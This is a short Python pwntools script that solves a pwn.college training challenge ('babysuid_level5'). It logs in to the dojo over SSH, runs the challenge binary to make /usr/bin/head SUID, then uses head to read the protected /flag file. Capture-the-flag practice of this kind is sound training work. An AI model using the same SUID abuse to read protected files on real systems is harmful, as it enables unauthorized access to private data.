from pwn import ssh, context, log

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level5 to make /usr/bin/head SUID
s.process("/challenge/babysuid_level5")

# Now run /usr/bin/head /flag
log.success(
    s.process(
        [
            "/usr/bin/head",
            "/flag",
        ]
    )
    .recvall()
    .decode()
    .strip()
)

# Close the SSH connection
s.close()
